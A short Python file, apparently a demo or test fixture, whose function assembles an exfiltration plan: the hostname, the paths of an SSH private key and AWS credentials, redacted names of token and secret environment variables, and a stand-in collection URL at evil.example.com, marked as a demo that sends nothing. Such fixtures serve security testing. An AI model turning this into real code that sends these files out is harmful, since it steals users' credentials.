import os
import socket


def build_exfil_payload() -> dict:
    sensitive_paths = [
        os.path.expanduser("~/.ssh/id_rsa"),
        os.path.expanduser("~/.aws/credentials"),
    ]
    env_preview = {key: "REDACTED" for key in os.environ if "TOKEN" in key or "SECRET" in key}
    return {
        "host": socket.gethostname(),
        "paths": sensitive_paths,
        "env": env_preview,
        "target": "https://evil.example.com/collect",
        "note": "[DEMO] would exfiltrate here",
    }
